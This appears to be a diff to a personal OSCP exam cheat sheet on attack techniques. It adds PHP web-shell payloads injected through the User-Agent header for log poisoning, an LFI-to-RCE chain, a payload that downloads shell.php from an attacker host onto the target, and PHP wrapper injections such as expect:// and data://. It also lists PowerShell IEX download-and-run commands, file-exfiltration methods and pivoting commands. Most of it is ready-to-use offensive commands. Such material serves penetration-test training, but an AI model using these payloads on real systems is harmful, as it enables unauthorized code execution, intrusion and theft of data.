@@ -1,14 +1,120 @@
 # OSCP Cheat Sheet by 0xpr0N3rd
 
-## Directory Traversal && LFI
+## Directory Traversal & LFI
 
+### Directory Traversal
 
+**IMPORTANT:** Find the **VULNERABLE** parameter **FIRST**.
+
+Read sample file on **Windows**:
+
+```
+vuln.php?param=c:\windows\system32\drivers\etc\hosts
+```
+
+Read sample file on **Linux**:
+
+```
+vuln.php?param=/etc/hosts
+```
+
+## 
+
+### Local File Inclusion
+
+**First**, Locate the **VULNERABLE** parameter.
+
+**Second**, try to do **Log Poisoning**:
+
+```
+User-Agent: <?php system($HTTP_GET_VARS[cmd]) ?><?php die ?>
+
+or 
+
+User-Agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+```
+
+**NOTE:** This injection is also possible if there's FTP installed on the box.
+
+**Third**, look again to the log files:
+
+**Windows:**
+
+```
+vuln.php?param=c:\xampp\apache\logs\access.log
+```
+
+**Linux:**
+
+```
+vuln.php?param=/var/log/apache2/access.log
+```
+
+**Fourth**, perform LFI:
+
+**Windows:**
+
+```
+vuln.php?param=c:\xampp\apache\logs\access.log&cmd=ipconfig
+```
+
+**Linux:**
+
+```
+vuln.php?param=/var/log/apache2/access.log&cmd=whoami
+```
+
+### IF POSSIBLE, TRY TO HIT AN RFI
+
+Perform Log Poisoning first.
+
+Then:
+
+```
+User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://<LHOST>/shell.php'))?>
+```
+
+### ANOTHER METHOD, PHP FILE WRAPPERS
+
+```
+vuln.php?param=data:text/plain, hello world
+```
+
+**Injection:**
+
+```
+vuln.php?param=data:text/plain, <?php echo shell_exec("cmd") ?>
+```
+
+### IMPORTANT NOTE
+
+If we are not able to read some ``.php`` files with either Directory Traversal or LFI, it may be happening because ``http://wrapper`` is disabled in the server configuration by setting ``allow_url_include`` to ``0``.
+
+What we can try is:
+
+```
+vuln.php?param=ftp://<FILE_NAME>
+
+or
+
+vuln.php?param=expect://<COMMAND>
+```
+
+OR
+
+```
+vuln.php?param=php://filter/convert.base64-encode/resource=<FILE_NAME>
+```
+
+### PHP Info LFI
+
+[See](https://github.com/0xpr0N3rd/OSCP-Prep/blob/main/HTB-Boxes/Linux-Boxes/2%20-%20Poison%20(Medium).md)
 
 -------------------------------------------------------------
 
 ## File Transfers
 
-**Method 1 (SMB Server) | Windows -> Linux**
+### Method 1 (SMB Server) | Windows -> Linux
 
 On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):
 
@@ -37,15 +143,15 @@ On **TARGET**:
 PS C:\> copy <FILE_NAME> \\<LHOST>\<SHARE_NAME>\<OUTPUT_FILE_NAME>
 ```
 
--------------------------------------------------------------
+## 
 
-**Method 2 (Web ROOT) | Windows -> Linux**
+### Method 2 (Web ROOT) | Windows -> Linux
 
 If you have the permission for copying the file to the webroot, copy the file to the server & download the file on **LOCAL**.
 
--------------------------------------------------------------
+##
 
-**Method 3 (FTP, works almost EVERYTIME) | Windows -> Linux**
+### Method 3 (FTP, works almost EVERYTIME) | Windows -> Linux
 
 On **LOCAL**:
 
@@ -65,9 +171,9 @@ ftp> password <BLANK>
 ftp> put <FILE_NAME>
 ```
 
--------------------------------------------------------------
+##
 
-**Method 4 (SMB Server) | Linux -> Windows**
+### Method 4 (SMB Server) | Linux -> Windows
 
 On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):
 
@@ -102,9 +208,9 @@ PS C:\> net use \\<LHOST>\<SHARE_NAME>
 PS C:\> net use copy \\<LHOST>\<SHARE_NAME>\<FILE_NAME>
 ```
 
--------------------------------------------------------------
+##
 
-**Method 5 (Standard IEX) | Linux -> Windows**
+### Method 5 (Standard IEX) | Linux -> Windows
 
 On **LOCAL**:
 
@@ -123,9 +229,9 @@ PS C:\> IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/<FI
 PS C:\> Get-ChildItem -Path C:\ -Include <FILE_NAME> -Recurse        <- Find downloaded file (recursively)
 ```
 
--------------------------------------------------------------
+##
 
-**Method 6 (Powershell) | Linux -> Windows**
+### Method 6 (Powershell) | Linux -> Windows
 
 On **LOCAL**:
 
@@ -143,15 +249,15 @@ On **TARGET**:
 PS C:> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<LHOST>:<LPORT>/<FILE_NAME>', 'C:\Users\Public\Downloads\<FILE_NAME>')"
 ```
 
--------------------------------------------------------------
+##
 
-**Method 7 (Browser) | Linux -> Windows**
+### Method 7 (Browser) | Linux -> Windows
 
 If there's a RDP or VNC connection, use browser on navigating the files.
 
--------------------------------------------------------------
+##
 
-**Method 8 (Standard wget) | Linux -> Linux**
+### Method 8 (Standard wget) | Linux -> Linux
 
 On **LOCAL**:
 
@@ -169,9 +275,9 @@ On **TARGET**:
 # wget http://<LHOST>:<LPORT>/<FILE_NAME>
 ```
 
--------------------------------------------------------------
+##
 
-**Method 9 (SCP) | Linux -> Linux**
+### Method 9 (SCP) | Linux -> Linux
 
 On **LOCAL**:
 
@@ -179,9 +285,9 @@ On **LOCAL**:
 # scp <FILE_NAME> <USERNAME>@<RHOST>:/<REMOTE_DIR>
 ```
 
--------------------------------------------------------------
+##
 
-**Method 10 (Socat) | Linux -> Linux**
+### Method 10 (Socat) | Linux -> Linux
 
 On **LOCAL**:
 
@@ -193,6 +299,40 @@ On **TARGET**:
 
 ```
 # socat TCP4:<LHOST>:<LPORT> file:<FILE_NAME>, create
+```
+
+-------------------------------------------------------------
+
+### File Servers
+
+**Python 2.x:**
+
+```
+# python -m SimpleHTTPServer <LPORT>
+```
+
+**Python 3.x:**
+
+```
+# python3 -m http.server <LPORT>
+```
+
+**PHP:**
+
+```
+# php -S 0.0.0.0:<LPORT>
+```
+
+**Ruby:**
+
+```
+# ruby -run -e httpd . -p <LPORT>
+```
+
+**Busybox:**
+
+```
+# busybox httpd -f -p <LPORT>
 ```
 
 -------------------------------------------------------------
@@ -230,7 +370,7 @@ or
 
 ## Port Forwarding 
 
-**Port Forwarding w/ProxyChains | UNIX**
+### Port Forwarding w/ProxyChains | UNIX
 
 **First**, on **LOCAL** set up ``/etc/proxychains.conf`` file:
 
@@ -287,9 +427,9 @@ from the **PIVOTED** box to perform a netcat port scan.
 3. Select **Proxy IP address** as ``127.0.0.1``
 4. Select **Port** as ``<LISTEN_PORT>``
 
--------------------------------------------------------------
+##
 
-**Port Forwarding w/PLINK.exe | Windows**
+### Port Forwarding w/PLINK.exe | Windows
 
 ***Upload*** ``plink.exe`` ***to the box. Preferably, under*** ``C:\Public\Downloads\`` ***location.***
 
@@ -323,9 +463,9 @@ C:\> plink.exe -N -R <LPORT>:127.0.0.1:<RPORT> -P 22 <RHOST>
 # nmap -sS -sV 127.0.0.1 -p <PORT>
 ```
 
--------------------------------------------------------------
+##
 
-**Port Forwarding w/NETSH.exe | Windows**
+### Port Forwarding w/NETSH.exe | Windows**
 
 **Establish connection:**
 
@@ -345,9 +485,9 @@ C:\> netstat -anp TCP | find <LPORT>
 C:\> netsh advfirewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<RHOST> localport=<RPORT> action=allow
 ```
 
--------------------------------------------------------------
+##
 
-**Port Forwarding w/Metasploit**
+### Port Forwarding w/Metasploit
 
 ```
 meterpreter> portfwd add –l <LPORT> –p <RPORT> –r <RHOST>
@@ -358,7 +498,21 @@ meterpreter> portfwd delete –l <LPORT> –p <RPORT> –r <RHOST>
 
 -------------------------------------------------------------
 
-# SMB
+## Remote File Inclusion
+
+Identify the **VULNERABLE** parameter.
+
+Then start a simple python web server or nc listener and do:
+
+```
+vuln.php?param=http://<LHOST>/randomfile
+```
+
+Check if there's a request popped up in web server or nc listener.
+
+-------------------------------------------------------------
+
+## SMB
 
 **Nmap:**
 
@@ -416,6 +570,7 @@ meterpreter> portfwd delete –l <LPORT> –p <RPORT> –r <RHOST>
 
 -------------------------------------------------------------
 
+## XSS
 
 
 
